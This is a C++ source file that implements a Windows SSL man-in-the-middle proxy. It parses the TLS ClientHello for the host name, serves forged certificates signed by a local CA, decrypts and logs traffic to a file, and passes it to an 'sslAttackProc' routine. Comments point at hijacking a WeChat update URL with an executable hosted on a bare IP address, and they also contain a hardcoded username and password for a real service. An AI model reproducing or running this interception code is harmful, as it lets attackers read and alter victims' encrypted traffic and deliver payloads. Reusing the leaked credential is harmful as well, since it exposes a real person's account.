#include <windows.h>
#include <WINSOCK2.H>
#include <stdexcept>
#include "sslPublic.h"
#include "sslPacket.h"
#include "sslproxy.h"
#include "../HttpUtils.h"
#include "..\\include\\openssl\\ssl.h"
#include "..\\include\\openssl\\err.h"
#include "MakeCert.h"
#include "HttpProxy.h"
#include "../Public.h"
#include "../utils/Tools.h"
#include "AuthorityCert.h"
#include "SSLAttack.h"
#include "PayloadServer.h"
#include "WeixinPC.h"
#include "../Public.h"
#include "SSLRetransfer.h"
#include "../Deamon.h"
#include <mstcpip.h>
#include <vector>
#include <stdio.h>
#include "InformerInterface.h"
#include "unzip.h"
#include "../Utils/lock.h"
#include "../cipher/compression.h"
#include "unzip.h"
#include "../FileOper.h"

//12306
//username = hong1976080990&password = SpkaHaPUP79MKVukA 

/*firefox设置使用windows根证书
1 在地址栏键入"about:config" 点击“我了解此风险”
2 在下方任意位置右键，选择新建布尔值
3 输入首选项名称为“security.enterprise_roots.enabled”并把值设置为 true
4 重启浏览器
*/








//TOOLSLOCK gcertlock = { 0 };

int SSLProxy::SSL_ProxyMain(LPSSLPROXYPARAM spp) {
	int				iCounter = 0;
	int				iRet = 0;
	unsigned char	recvBuffer[NETWORK_BUFFER_SIZE + 4];

	iCounter = ReadPendingData((char*)recvBuffer, NETWORK_BUFFER_SIZE, spp->SSLToClient);
	if (iCounter <= 0)			//if ret = 0, need to be further judgment
	{
		return FALSE;
	}
	else {
		*(recvBuffer + iCounter) = 0;

		iRet = unzip((char*)recvBuffer, iCounter);
		if (iRet == 0) {
			iRet = Public::writeFile(SSL_PROXY_FILE, recvBuffer, iCounter, "\r\n\r\nSSL PACKET:\r\n\r\n");
		}
	}

	iRet = HttpsAttack::sslAttackProc((char*)recvBuffer, iCounter, spp);
	if (iRet > 0 )
	{
		return FALSE;
	}

	DWORD dwip = HttpUtils::getIPFromHost(spp->host);
	if (dwip == 0) {
#ifdef _DEBUG
		//log( "[%s %d]getIPFromHost:%s error\r\n",__FUNCTION__,__LINE__, spp->host);
#endif
		return FALSE;
	}

	spp->sockToServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (spp->sockToServer <= 0)
	{
		printf("[%s %d] error:%d", __FUNCTION__, __LINE__, WSAGetLastError());
		return FALSE;
	}

	int overtime = CONNECTION_TIME_OUT;
	iRet = setsockopt(spp->sockToServer, SOL_SOCKET, SO_RCVTIMEO, (char *)&overtime, sizeof(int));
	iRet += setsockopt(spp->sockToServer, SOL_SOCKET, SO_SNDTIMEO, (char *)&overtime, sizeof(int));

	spp->saToServer.sin_addr.S_un.S_addr = dwip;
	spp->saToServer.sin_port = ntohs(spp->usPort);
	spp->saToServer.sin_family = AF_INET;
		
	iRet = connect(spp->sockToServer, (struct sockaddr *)&(spp->saToServer), sizeof(sockaddr_in));
	if (iRet )
	{
		printf("[%s %d] connect server:%s,ip:%08x error:%u\r\n", __FUNCTION__, __LINE__, spp->host,
			spp->saToServer.sin_addr.S_un.S_addr, WSAGetLastError());
		return FALSE;
	}


	if (spp->version == 0x0303 || spp->version == 0x0203 || spp->version == 0x0103)
	{
		spp->ctxToServer = SSL_CTX_new(TLSv1_2_client_method());
	}
	else {
		spp->ctxToServer = SSL_CTX_new(SSLv23_client_method());
	}

	if ((int)spp->ctxToServer <= 0)
	{
		printf("[%s %d]SSL_CTX_new error\n", __FUNCTION__, __LINE__ );
		return FALSE;
	}

	spp->SSLToServer = SSL_new(spp->ctxToServer);
	if ((int)spp->SSLToServer <= 0)
	{
		printf("[%s %d] SSL_new error\n", __FUNCTION__, __LINE__);
		return FALSE;
	}

	iRet = SSL_set_fd(spp->SSLToServer, spp->sockToServer);
	if (iRet != 1)
	{
		printf("[%s %d]SSL_set_fd error:%d,state string:%s,description:%s,result:%d\n", __FUNCTION__, __LINE__,
			SSL_get_error(spp->SSLToServer, iRet), SSL_state_string(spp->SSLToServer),SSL_state_string_long(spp->SSLToServer), iRet);
		return FALSE;
	}

	iRet = SSL_connect(spp->SSLToServer);
	if (iRet != 1)
	{
		printf("[%s %d]SSL_connect error:%d,state string:%s,description:%s,result:%d\n", __FUNCTION__, __LINE__,
			SSL_get_error(spp->SSLToServer, iRet), SSL_state_string(spp->SSLToServer),SSL_state_string_long(spp->SSLToServer), iRet);
		return FALSE;
	}

	iRet = SSL_write(spp->SSLToServer, recvBuffer, iCounter);
	if (iRet != iCounter)
	{
		printf("[%s %d]SSL_write error:%d,state string:%s,description:%s,result:%d\n", __FUNCTION__, __LINE__,
			SSL_get_error(spp->SSLToServer, iRet), SSL_state_string(spp->SSLToServer),SSL_state_string_long(spp->SSLToServer), iRet);
		return FALSE;
	}

	fd_set	stFdSet = { 0 };
	timeval	stTmVal = { 0 };
	stTmVal.tv_sec = SELECT_TIME_OUT / 1000;
	stTmVal.tv_usec = 0;

	SOCKET selectsock = spp->sockToServer;
	if (spp->sockToClient > spp->sockToServer)
	{
		selectsock = spp->sockToClient;
	}

#undef FD_SETSIZE
#define FD_SETSIZE 1024

	while (TRUE)
	{
		FD_ZERO(&stFdSet);
		FD_SET(spp->sockToClient, &stFdSet);
		FD_SET(spp->sockToServer, &stFdSet);

		iRet = select(selectsock + 1, &stFdSet, NULL, NULL, &stTmVal);
		if (iRet <= 0 || iRet > 2)
		{
			break;
		}

		if (FD_ISSET(spp->sockToClient, &stFdSet))
		{
			iCounter = ReadPendingData((char*)recvBuffer, NETWORK_BUFFER_SIZE, spp->SSLToClient);
			if (iCounter <= 0)
			{
				break;
			}

			*(recvBuffer + iCounter) = 0;

			iRet = unzip((char*)recvBuffer, iCounter);
			if (iRet == 0) {
				iRet = Public::writeFile(SSL_PROXY_FILE, recvBuffer, iCounter, "");
			}

			iRet = HttpsAttack::sslAttackProc((char*)recvBuffer, iCounter, spp);
			if (iRet > 0)
			{
				break;
			}

			iRet = SSL_write(spp->SSLToServer, (char *)recvBuffer, iCounter);
			if (iRet != iCounter)
			{
				break;
			}

			spp->timeclient = time(0);
		}

		if (FD_ISSET(spp->sockToServer, &stFdSet))
		{
			iCounter = ReadPendingData((char*)recvBuffer, NETWORK_BUFFER_SIZE, spp->SSLToServer);
			if (iCounter <= 0)
			{
				break;
			}

			*(recvBuffer + iCounter) = 0;

			iRet = unzip((char*)recvBuffer, iCounter);
			if (iRet == 0) {
				iRet = Public::writeFile(SSL_PROXY_FILE, recvBuffer, iCounter, "");
			}

			iRet = SSL_write(spp->SSLToClient, (char *)recvBuffer, iCounter);
			if (iRet != iCounter)
			{
				break;
			}

			spp->timeserver = time(0);
		}
	}

	return TRUE;
}




int SSLProxy::SSL_ProxyClient(LPSSLPROXYPARAM spp) {

	int iRet = 0;

	char szpeekbuf[NETWORK_BUFFER_SIZE +4];
	int peeklen = recv(spp->sockToClient, szpeekbuf, NETWORK_BUFFER_SIZE, MSG_PEEK);
	if (peeklen > 0)
	{
		*(szpeekbuf + peeklen) = 0;

		if (HttpUtils::isHttpPacket(szpeekbuf))
		{
			//return FALSE;
			return HttpProxy::HttpProxyMain((LPHTTPPROXYPARAM)spp);
		}
		else {
			iRet = getServerNameFromClientHello(szpeekbuf, peeklen,( char*)spp->host, spp->version);
			if (iRet > 0)
			{
				iRet = SSLPublic::isTargetHost(spp->host);
				if (iRet )
				{
				}
				else {
					return FALSE;
					//return SSLRetransfer::RetransferProxyMain((LPHTTPPROXYPARAM)pstSSLProxyParam);
				}
			}
			else if (iRet == 0) {
				//lstrcpyA(pstSSLProxyParam->host, gstrServerIP.c_str());
				lstrcpyA(spp->host, MYOWNSITE_ATTACK_DOMAINNAME);
				//lstrcpyA(spp->host, "MyDummyCert");
				
				//https://47.101.189.13/test20190402/wechatweb.exe
				//https://47.101.189.13:443/weixin/android/wxweb/updateConfig.xml
				//https://dldir1.qq.com/weixin/android/wxweb/updateConfig.xml	
			}
			else {
				//not ssl
				return FALSE;
				//return SSLRetransfer::RetransferProxyMain((LPHTTPPROXYPARAM)pstSSLProxyParam);
			}
		}
	}
	else {
		log("[%s %d] MSG_PEEK size:%d error:%u\r\n", __FUNCTION__, __LINE__,peeklen, WSAGetLastError());
		return -1;
	}

	if (strstr(spp->host, "dldir1.qq.com") || strstr(spp->host, MYOWNSITE_ATTACK_DOMAINNAME))
	{
		//return AuthorityCert::processAuthorCert(pstSSLProxyParam->host, MYOWNSITE_ATTACK_DOMAINNAME, pstSSLProxyParam);
	}

	//LARGE_INTEGER li = { 0 };
	//iRet = QueryPerformanceCounter(&li);
	//ULONGLONG id = li.HighPart;
	//id = (id << 32) | li.LowPart;
	//int lockret = Lock::enterlock(gcertlock, id);

	iRet = MakeCert::MakesureCertExist(spp->host);
	
	//lockret = Lock::leavelock(gcertlock, id);

	if (iRet == FALSE)
	{
		printf("[%s %d]MakesureCertExist server name:%s error\n", __FUNCTION__, __LINE__, spp->host);
		return FALSE;
	}

	//小端顺序为0x0103 0x0303 0x0203,网络字节顺序0x0301,0x0303,0x0302
	//0x0300 = sslv3,0x0301 = tls1.0,0x0302 = tls1.1,0x0303=tls1.2
	if (spp->version == 0x0303 || spp->version == 0x0203 || spp->version == 0x0103)
	{
		spp->ctxToClient = SSL_CTX_new(TLSv1_2_server_method());
	}
	else {
		spp->ctxToClient = SSL_CTX_new(SSLv23_server_method());
	}

	if ((int)spp->ctxToClient <= 0)
	{
		printf("[%s %d]SSL_CTX_new %s error\n", __FUNCTION__, __LINE__, spp->host);
		return FALSE;
	}

	SSL_CTX_set_verify(spp->ctxToClient, SSL_VERIFY_NONE, 0);

	string cafilename = gLocalPath + CA_CERT_PATH + "\\" + CA_CRT_FILENAME;
	iRet = SSL_CTX_load_verify_locations(spp->ctxToClient, cafilename.c_str(), 0);
	if (iRet != 1)
	{
		printf("[%s %d]SSL_CTX_load_verify_locations %s error\n", __FUNCTION__, __LINE__, spp->host);
		return FALSE;
	}

	SSL_CTX_set_default_passwd_cb_userdata(spp->ctxToClient, PRIVATE_KEY_PWD);

	string certfilename = gLocalPath + CERT_PATH + "\\" + string(spp->host) + ".crt";
	iRet = SSL_CTX_use_certificate_file(spp->ctxToClient, certfilename.c_str(), SSL_FILETYPE_PEM);
	if (iRet <= 0)
	{
		printf("[%s %d]SSL_CTX_use_certificate_file %s\n", __FUNCTION__, __LINE__, certfilename.c_str());
		return FALSE;
	}

	string keyfilename = gLocalPath + CA_CERT_PATH + "\\" + SUBCA_KEY_FILENAME;
	iRet = SSL_CTX_use_PrivateKey_file(spp->ctxToClient, keyfilename.c_str(), SSL_FILETYPE_PEM);
	if (iRet <= 0)
	{
		printf("[%s %d]SSL_CTX_use_certificate_file %s error\n", __FUNCTION__, __LINE__, keyfilename.c_str());
		return FALSE;
	}

	iRet = SSL_CTX_check_private_key(spp->ctxToClient);
	if (iRet <= 0)
	{
		printf("[%s %d]SSL_CTX_check_private_key %s error\n", __FUNCTION__, __LINE__, spp->host);
		return FALSE;
	}

	spp->SSLToClient = SSL_new(spp->ctxToClient);
	if ((int)spp->SSLToClient <= 0)
	{
		printf("[%s %d]SSL_new %s error\n", __FUNCTION__, __LINE__, spp->host);
		return FALSE;
	}

	iRet = SSL_set_fd(spp->SSLToClient, spp->sockToClient);
	if (iRet != 1)
	{
		printf("[%s %d]SSL_set_fd %s error:%d,state string:%s,description:%s,return:%d\n", __FUNCTION__, __LINE__, spp->host,
			SSL_get_error(spp->SSLToClient, iRet), SSL_state_string(spp->SSLToClient),SSL_state_string_long(spp->SSLToClient), iRet);
		return FALSE;
	}

	//SSL_set_accept_state(pstSSLProxyParam->SSLToClient);

	iRet = SSL_accept(spp->SSLToClient);
	if (iRet != 1)
	{
		printf("[%s %d]SSL_accept %s error:%d,state string:%s,description:%s,return:%d\n", __FUNCTION__, __LINE__, spp->host,
			SSL_get_error(spp->SSLToClient, iRet), SSL_state_string(spp->SSLToClient),SSL_state_string_long(spp->SSLToClient), iRet);
		return FALSE;
	}

	iRet = SSL_ProxyMain(spp);

	return iRet;
}





int __stdcall SSLProxy::SSL_Proxy(MIM_THREAD_PARAMS * param) {

	LPSSLPROXYPARAM spp = 0;

	int ret = 0;

	while (TRUE)
	{
		__try
		{
			ret = WaitForSingleObject(param->gSSLEvent, INFINITE);

			spp = param->gSSLProxyParam;

			ret = SetEvent(param->gSSLListenEvent);

			int overtime = CONNECTION_TIME_OUT;
			ret = setsockopt(spp->sockToClient, SOL_SOCKET, SO_RCVTIMEO, (char *)&overtime, sizeof(int));
			ret += setsockopt(spp->sockToClient, SOL_SOCKET, SO_SNDTIMEO, (char *)&overtime, sizeof(int));

			ret = SSL_ProxyClient(spp);

			Deamon::removeSSL(spp);
		}
		__except (1)
		{
			log("[%s %d] exception code:%d thread id:%d\r\n", __FUNCTION__, __LINE__, GetLastError(),spp->ulThreadID);

		}
	}

	return FALSE;
}



SSLProxy::SSLProxy() {


	mInstance = this;

	//Lock::initlock(gcertlock, "certlock", 3000);
}

SSLProxy::~SSLProxy() {

}





//SSL_read_ex() and SSL_read() try to read num bytes from the specified ssl into the buffer buf. 
//On success SSL_read_ex() will store the number of bytes actually read in *readbytes.
//The read functions work based on the SSL / TLS records.
//The data are received in records(with a maximum record size of 16kB)
//SSL_peek_ex() and SSL_peek() are identical to SSL_read_ex() and SSL_read() 
//respectively except no bytes are actually removed from the underlying BIO during the read, 
//so that a subsequent call to SSL_read_ex() or SSL_read() will yield at least the same bytes

//SSL_read_ex() and SSL_peek_ex() will return 1 for success or 0 for failure

int SSLProxy::ReadPendingData(char * buf, int bufSize, SSL * ssl) {
	
	int recvcnt = 0;
	
	int sslerror = 0;
	
	int peeklen = SSL_peek(ssl, buf + recvcnt, bufSize - recvcnt);
	if (peeklen <= 0)
	{
		return recvcnt;
	}

	do
	{
		int rs = SSL_read(ssl, buf + recvcnt, bufSize - recvcnt);
		//SSL_get_error(ssl, ret) == SSL_ERROR_WANT_READ
		//pendsize = SSL_pending(ssl);	//always return 0
		sslerror = SSL_get_error(ssl, rs);
		if (sslerror != SSL_ERROR_NONE || rs <= 0)
		{
			return recvcnt;
		}
		else {
			recvcnt += rs;
		}
	} while (recvcnt < peeklen);

	int pnlen = 0;
	if (peeklen == 1)
	{
		pnlen = SSL_peek(ssl, buf + recvcnt, bufSize - recvcnt);
		if (pnlen > 0)
		{
			int rs = SSL_read(ssl, buf + recvcnt, bufSize - recvcnt);
			sslerror = SSL_get_error(ssl, rs);
			if (sslerror != SSL_ERROR_NONE || rs <= 0 )
			{
				log("%s %d error:%u\r\n", __FUNCTION__,__LINE__,sslerror);
				return recvcnt;
			}
			else {
				recvcnt += rs;
			}
		}
	}

	if (recvcnt != peeklen + pnlen)
	{
		log("%s %d recv size:%u,peek size:%u ,peek second size:%u error\r\n", __FUNCTION__, __LINE__, recvcnt, peeklen, pnlen);
	}
	return recvcnt;
}




int SSLProxy::getServerNameFromClientHello(char * data, int len,char * host, int & version) {

#ifdef _DEBUG
	//FileOper::fileWriter("clienthello.dat", data, len);
#endif
	SSLHEADER * lphdr = (LPSSLHEADER)data;
	if (lphdr->contenttype == 0x16 && lphdr->handshaketype == 1)
	{
		int mainver = lphdr->version & 0xff;
		int subver = (lphdr->version & 0xff00) >> 8;

		int hsmainver = lphdr->handshakever & 0xff;
		int hssubver = (lphdr->handshakever) >> 8;
		version = lphdr->version;

		if (hsmainver == 3 && hssubver == 3)
		{

		}
		else {
			log("[%s %d]client hello major version:%u,minor version:%u,handshake major version:%u,sub version:%u\r\n",
				mainver,subver, hsmainver, hssubver);
		}
	}
	else {
		return -1;

		LPRESSLHEADER lpressl = (LPRESSLHEADER)data;
		if (lpressl->version == 0x80 && lpressl->type == 1 && lpressl->sessionIdLen == 0)
		{
			return FALSE;	// not standard ssl packet
		}
		else {
			return -1;
		}
	}

	//check ssl client hello length
	int sslhellolen = ntohs(lphdr->hdrlen);
	if (sslhellolen + 5 != len)
	{
		printf("[%s %d] client hello header length:%u not equal to packet size:%u\r\n", __FUNCTION__, __LINE__, sslhellolen,len);
		return -1;		//ip segment packet,need to wait
	}

	char * ciphersuit = data + sizeof(SSLHEADER) + lphdr->sessionidlen;
	int cipherlen = ntohs(*(short*)ciphersuit);
	if (cipherlen >= len || cipherlen <= 0)
	{
		printf("[%s %d] client hello cipher suit length error\r\n", __FUNCTION__, __LINE__);
		return -1;
	}

	char * compress = ciphersuit + sizeof(short) + cipherlen;
	int comppresslen = *compress;
	if (comppresslen < 0)
	{
		printf("[%s %d] client hello comppress methods length error\r\n", __FUNCTION__, __LINE__);
		return -1;
	}

	char * lpexthdr = compress + sizeof(char) + comppresslen;
	int extlen = ntohs(*(short*)lpexthdr);
	int extbefore = lpexthdr - data + sizeof(short);
	if (extbefore + extlen != len)
	{
		printf("[%s %d] client hello extensions length:%u,ext before length:%u,client hello packet length:%u error\r\n", 
			__FUNCTION__, __LINE__,extlen, extbefore, len);
		return -1;
	}

	LPSSLHEADER_EXTENSIONS lpext = (LPSSLHEADER_EXTENSIONS)(lpexthdr + sizeof(short));
	while (1)
	{
		if (lpext->exttype == 0)
		{
			LPCLIENTHELLO_SERVERNAME lpserver = (LPCLIENTHELLO_SERVERNAME)lpext;
			if (lpserver->servernametype == 0)
			{
				char* servername = (char*)((unsigned int)lpserver + sizeof(CLIENTHELLO_SERVERNAME));

				int servernamelen = ntohs(lpserver->sernamelen);
				if (servernamelen >= 256 || servernamelen <= 0)
				{
					printf("[%s %d]client hello host name:%s length:%u error\r\n", __FUNCTION__, __LINE__, servername, servernamelen);
					return -1;
				}
				
				memcpy(host, servername, servernamelen);
				*(host + servernamelen) = 0;
				if (*servername >= 0x80 || *servername <= 0)
				{
					log("[%s %d]client hello server name format:%x error\r\n", __FUNCTION__, __LINE__,*(DWORD*)servername);
					return -1;
				}
				return servernamelen;
			}
		}

		int extblocksize = sizeof(SSLHEADER_EXTENSIONS) + ntohs(lpext->typelen);
		if (extblocksize >= len || extblocksize <= 0)
		{
			printf("[%s %d] client hello extensions block size error\r\n", __FUNCTION__, __LINE__);
			return -1;
		}

		lpext = (LPSSLHEADER_EXTENSIONS)((unsigned int)lpext + extblocksize);
		if ((int)lpext - (int)data >= len)
		{
			break;
		}
	}

	return FALSE;
}